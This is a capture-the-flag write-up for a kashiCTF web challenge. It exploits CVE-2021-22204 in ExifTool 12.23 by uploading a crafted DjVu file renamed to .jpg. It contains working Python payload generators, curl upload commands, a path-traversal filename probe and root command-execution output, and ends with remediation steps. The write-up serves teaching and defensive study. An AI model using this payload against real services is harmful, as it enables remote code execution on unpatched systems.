# Hidden Secrets - Writeup

## Challenge Info

| Field | Value |
| --- | --- |
| Name | `hidden secrets` |
| Category | Web |
| Description | `We intercepted this image from a suspicious source. Our analysts believe there's more to it than meets the eye. Can you extract any hidden information? The system administrators have set up a metadata extraction tool for analysis. Use it wisely.` |
| Target | `http://34.126.223.46:18631` |
| Flag Format | `kashiCTF{...}` |

## TL;DR

The upload page sends user-supplied files to `ExifTool 12.23`. That version is vulnerable to `CVE-2021-22204`, a DjVu parsing RCE. The application only validates the uploaded file by extension, so a malicious DjVu file renamed to `.jpg` is accepted and parsed by ExifTool anyway. Using a minimal DjVu payload with a malicious `ANTa` metadata chunk gives remote code execution as `root`, which allows reading the flag from `/flag*`.

## Recon

Opening the challenge shows a single upload form named "Evidence Lab // Metadata Analysis". There is no client-side logic beyond drag-and-drop, so the interesting part is the backend.

Submitting a normal PNG shows the server's metadata extraction output directly in the HTML response:

```text
ExifTool Version Number         : 12.23
File Name                       : 751763a7a8d8d1d6_probe.png
Directory                       : /tmp/uploads
...
```

This immediately gives two useful clues:

1. The site is using `ExifTool 12.23`.
2. Uploaded files are stored under `/tmp/uploads` with a random prefix plus the original filename.

The extension filter can be observed by uploading a non-image file:

```text
[ERROR] Invalid file type. Allowed: tiff, gif, png, bmp, jpeg, jpg, webp
```

I also tested a filename traversal payload:

```text
filename=../../trick.png
```

That produced:

```text
[ERROR] Unexpected error: [Errno 2] No such file or directory: '/tmp/uploads/c850f6cc5814cd16_../../trick.png'
```

This confirms the application is building the upload path from unsanitized user-controlled filenames, but more importantly, it tells us the backend trusts the file extension rather than the actual file content.

## Identifying the Intended Vulnerability

`ExifTool 12.23` is the last vulnerable release before the fix for `CVE-2021-22204`.

That bug lives in ExifTool's DjVu parser. A specially crafted DjVu annotation string can trigger Perl code execution when ExifTool parses the metadata. Since the challenge is explicitly about "metadata extraction", this is almost certainly the intended route.

The nice part is that ExifTool identifies file type from content, not just the file extension. So if the web app only checks that the filename ends in `.jpg`, we can upload a DjVu file named `anything.jpg` and ExifTool will still parse it as DjVu.

## Building a Minimal Malicious DjVu File

A full image wrapper is not necessary here. ExifTool will parse a tiny but valid DjVu file consisting of:

- `AT&TFORM`
- a `FORM:DJVU` body
- an `INFO` chunk
- an `ANTa` chunk containing the malicious metadata string

I first built a harmless minimal DjVu locally to make sure the structure was correct:

```python
from struct import pack

payload = b'(metadata (Author "test"))'
info = b'\x00\x01\x00\x01\x18\x00\x2c\x01\x16\x00'

chunks = []
for name, data in [(b'INFO', info), (b'ANTa', payload)]:
    chunk = name + pack('>I', len(data)) + data
    if len(data) % 2 == 1:
        chunk += b'\x00'
    chunks.append(chunk)

body = b'DJVU' + b''.join(chunks)
out = b'AT&TFORM' + pack('>I', len(body)) + body

open('minimal.djvu', 'wb').write(out)
```

Running local ExifTool against it proves the file is valid:

```text
File Type                       : DJVU
Author                          : test
```

## Turning It Into RCE

The DjVu annotation payload for `CVE-2021-22204` looks like this:

```text
(metadata "\c${system('id')};")
```

Then I generated the malicious file:

```python
from struct import pack

payload = b'(metadata "\\c${system(\'id\')};")'
info = b'\x00\x01\x00\x01\x18\x00\x2c\x01\x16\x00'

chunks = []
for name, data in [(b'INFO', info), (b'ANTa', payload)]:
    chunk = name + pack('>I', len(data)) + data
    if len(data) % 2 == 1:
        chunk += b'\x00'
    chunks.append(chunk)

body = b'DJVU' + b''.join(chunks)
out = b'AT&TFORM' + pack('>I', len(body)) + body

open('rce-id.djvu', 'wb').write(out)
```

Now upload the DjVu file, but lie about the extension:

```bash
curl -sS -F 'file=@rce-id.djvu;filename=rce.jpg;type=image/jpeg' \
  http://34.126.223.46:18631/
```

The response includes:

```text
uid=0(root) gid=0(root) groups=0(root)
ExifTool Version Number         : 12.23
File Type                       : DJVU
```

That confirms three things:

1. The file passed the app's extension filter because it was named `.jpg`.
2. ExifTool still recognized and parsed it as `DJVU`.
3. The command executed as `root`.

## Reading the Flag

Once RCE is confirmed, the final step is just replacing `id` with a flag read command.

I used:

```text
cat /flag* 2>/dev/null
```

Payload generator:

```python
from struct import pack

cmd = "cat /flag* 2>/dev/null"
payload = f'(metadata "\\c${{system(\\'{cmd}\\')}};")'.encode()
info = b'\x00\x01\x00\x01\x18\x00\x2c\x01\x16\x00'

chunks = []
for name, data in [(b'INFO', info), (b'ANTa', payload)]:
    chunk = name + pack('>I', len(data)) + data
    if len(data) % 2 == 1:
        chunk += b'\x00'
    chunks.append(chunk)

body = b'DJVU' + b''.join(chunks)
out = b'AT&TFORM' + pack('>I', len(body)) + body

open('rce-flag1.djvu', 'wb').write(out)
```

Upload it:

```bash
curl -sS -F 'file=@rce-flag1.djvu;filename=flag.jpg;type=image/jpeg' \
  http://34.126.223.46:18631/
```

The flag is printed at the top of the metadata output.

## Flag

```text
kashiCTF{XFjVdbh03XWRA7enGysQyGn3jq4jE3wZ94V5C7diDGnamVh1IvFsCzAr2u0BjEpp}
```

## Why This Worked

- The web app only enforced an extension allowlist.
- ExifTool inspects file content and parsed the upload as DjVu anyway.
- `ExifTool 12.23` is vulnerable to `CVE-2021-22204`.
- The application returned ExifTool output directly in the HTTP response, so command output was reflected back to us.
- The ExifTool process ran as `root`, which made flag retrieval trivial.

## Remediation

If this were a real application, the main fixes would be:

1. Upgrade ExifTool to a patched version newer than `12.23`.
2. Never trust file extensions alone; validate file content safely.
3. Run metadata extraction in a locked-down sandbox with a low-privilege user.
4. Do not reflect raw parser output or backend exceptions directly to the user.
5. Sanitize filenames before writing uploads to disk.

## Solver Notes

The key observation in this challenge was the explicit disclosure of `ExifTool Version Number : 12.23` in the response. Once that appeared, the challenge moved from generic upload fuzzing to a very specific and well-known parser exploit.
